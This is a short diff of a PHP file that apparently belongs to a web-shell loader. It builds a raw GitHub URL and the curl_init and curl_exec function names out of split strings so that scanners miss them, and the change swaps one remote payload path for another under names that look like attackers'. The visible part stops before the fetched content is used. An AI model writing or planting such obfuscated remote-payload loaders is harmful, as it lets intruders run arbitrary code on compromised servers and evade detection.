@@ -4,7 +4,7 @@ ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
-$url = "https://" . "raw.github" . "user" . "content.com/" . "hacker-d/imun/main/minion.txt";
+$url = "https://" . "raw.github" . "user" . "content.com/" . "DamnSec/x/main/1.txt";
 
 $f_ab = 'curl_' . 'init';
 $f_cd = 'curl_' . 'exec';
